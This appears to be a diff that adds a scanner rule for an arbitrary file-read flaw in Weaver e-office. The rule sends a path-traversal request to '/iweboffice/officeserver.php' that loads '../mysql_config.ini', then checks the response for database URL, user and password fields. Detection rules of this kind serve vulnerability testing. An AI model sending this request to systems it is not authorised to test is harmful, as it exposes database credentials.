@@ -1,0 +1,8 @@
+name: weaver-ecology-e-office-officeserver-file-read
+rules:
+  - method: GET
+    path: "/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini"
+    expression: |
+      response.status == 200 && response.body.bcontains(b'dataurl') && response.body.bcontains(b'datauser') && response.body.bcontains(b'datapassword') && response.body.bcontains(b'dataname')
+detail:
+  author: 666
